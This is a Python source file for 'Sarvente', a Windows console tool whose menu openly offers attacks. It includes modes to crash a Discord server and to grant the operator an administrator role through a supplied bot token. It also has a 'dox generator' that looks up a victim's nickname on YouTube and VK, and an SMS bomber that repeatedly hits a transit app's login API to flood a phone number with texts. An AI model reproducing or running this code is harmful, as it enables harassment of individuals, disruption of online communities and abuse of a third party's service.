import os
print('Setting up sarvente. Please wait...')

os.system('cd data&title > status.txt&title > token.txt&title > mode.txt&title Sarvente')
os.system('cls')

import requests
from tqdm import tqdm
import time
import dhooks

version = 'v1.2'

def main():
	os.system('cls')
	os.system('title Sarvente')
	print(f'''
███████╗ █████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗████████╗███████╗
██╔════╝██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
███████╗███████║██████╔╝██║   ██║█████╗  ██╔██╗ ██║   ██║   █████╗  
╚════██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  
███████║██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║   ██║   ███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝                                                                    
only Windows | {version} | by therealphantom#1730''')
	print('''
\nSelect mode:
1 - Crash discord server
2 - Webhook sender
3 - Give administrative role
4 - Dox generator
5 - Telegram bot sender
6 - SMS bomber
\n''')
	mode = input()
	if(mode == '1'):
		os.system('cls')
		print('Selected crash discord server.')
		time.sleep(3)
		os.system('cls')
		token = input('Enter discord bot token: ')
		os.system('cls')
		print('Saving...')
		token_file = open('data/token.txt', 'w')
		token_file.write(token)
		token_file.close()
		time.sleep(1)
		print('Saved!')
		time.sleep(2)
		os.system('cls')
		os.system('cd data&start botlauncher.cmd')
		time.sleep(2)
		print('Summoned discord bot module. Print "!connect" to connect the server')
		print('Waiting for connect...')
		with open('data/mode.txt', 'w') as f:
			f.write('crash')
			f.close()
		while open('data/status.txt').read() != 'connected':
			pass
		print('Connected!')
		print('Starting crash..')
		input('Press Enter to stop.')
		os.system('taskkill /f /im cmd.exe')
		main()
	if mode == '2':
		os.system('cls')
		print('Selected webhook sender.')
		time.sleep(3)
		os.system('cls')
		url = input('Enter webhook url: ')
		os.system('cls')
		print('Connecting to the webhook...')
		try:
			hook = dhooks.Webhook(url)
		except:
			input('Incorrect webhook url. Press ENTER to quit.')
			main()
		print('Connected!')
		while True:
			os.system('cls')
			print('''Webhook Sender - Sarvente. Type "!wsender exit" to quit\nTo send embed enter "!wsender embed [title] [description]"\n--------------------------------------''')
			msg = input('Enter message: ')
			if msg == '!wsender exit':
				main()
			if msg.split(' ')[0] == '!wsender' and msg.split(' ')[1] == 'embed':
				emb = dhooks.Embed(title = msg.split(' ')[2], description = msg.split(' ')[3])
				hook.send(embed=emb)
			if msg.split(' ')[0] != '!wsender':
				hook.send(msg)
	if mode == '3':
		os.system('cls')
		print('Selected give administrative role.')
		time.sleep(3)
		os.system('cls')
		owner_id = input('Enter your id: ')
		token = input('Enter discord bot token: ')
		os.system('cls')
		print('Saving...')
		token_file = open('data/token.txt', 'w')
		token_file.write(token)
		token_file.close()
		time.sleep(1)
		print('Saved!')
		time.sleep(2)
		os.system('cls')
		os.system('cd data&start botlauncher.cmd')
		print('Summoned discord bot module. Print "!connect" to connect the server')
		print('Waiting for connect...')
		with open('data/mode.txt', 'w') as f:
			f.write('adminrole')
			f.close()
		with open('data/output.txt', 'w') as f:
			f.write(owner_id)
			f.close()
		while open('data/output.txt', 'r').read() != 'clear':
			pass
		os.system('cd data&title > output.txt&title Sarvente')
		while open('data/status.txt', 'r').read() != 'connected':
			pass
		print('Connected.')
		print('If bot has permission ADMINISTRATOR, created role sarvente and gived to your id.')
		input('Press ENTER to quit.')
		os.system('taskkill /f /im cmd.exe')
		main()
	if mode == '4':
		os.system('cls')
		print('Selected dox generator.')
		time.sleep(3)
		os.system('cls')
		nickname1 = input("Enter victim's nickname: ")
		os.system('cls')
		print('Checking nickname...\n')
		yturl = f'https://www.youtube.com/user/{nickname1}'
		vkurl = f'https://vk.com/{nickname1}'
		resp = requests.get(yturl)
		if resp.status_code == 200:
			print(f'YouTube - Finded! URL: {yturl}')
		else:
			print(f'YouTube - Error!')
		resp = requests.get(vkurl)
		if resp.status_code == 200:
			print(f'VK - Finded! URL: {vkurl}')
		else:
			print(f'VK - Error!')
		print('\nChecking complete.')
		input('Press ENTER to quit.')
		main()
	if mode == '5':
		os.system('cls')
		print('Selected telegram bot sender.')
		time.sleep(3)
		token = input('Enter telegram bot token: ')
		url = f'https://api.telegram.org/bot{token}/'
		os.system('cls')
		print('Setting up sender:')
		username = input('1. Enter your username: ')
		os.system('cls')
		print('Send message to telegram bot.')
		print('Getting message from you...')
		resp = requests.get(url + 'getUpdates')
		resp_json = resp.json()
		empty = True
		while empty == True:
			time.sleep(1)
			if resp.status_code == 200:
				if resp_json['result'][0]['message']['from']['username'] == username:
					chatid = resp_json['result'][0]['message']['chat']['id']
					empty = False
		os.system('cls')
		print(f'Message received!\n\nSender configured:\nChat ID: {chatid}')
		time.sleep(2)
		while True:
			os.system('cls')
			print('Telegram bot sender - Sarvente.')
			print('To quit enter !tsender exit')
			print('----------------------------------')
			msg = input('Enter message: ')
			if msg == '!tsender exit':
				main()
			resp = requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={msg}')
			if resp.status_code != 200:
				print(f'Message error! Status code: {resp.status_code}')
				time.sleep(3)
	if mode == '6':
		headers = ({'User-Agent':'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
		os.system('cls')
		print('Selected sms bomber.')
		time.sleep(3)
		os.system('cls')
		print('Sarvente - SMS Bomber')
		print('----------------------------')
		phone = input('Enter phone number (without plus): ')
		url = f'https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{phone}'
		cycles = int(input('Enter number of messages: '))
		success = 0
		fail = 0
		for i in tqdm(range(cycles)):
			resp = requests.get(url)
			if resp.status_code == 200:
				success += 1
			else:
				fail += 1
		print(f'Succesful messages: {success}')
		print(f'Failed messages: {fail}')
		input('Press ENTER to quit.')
		main()

	main()

main()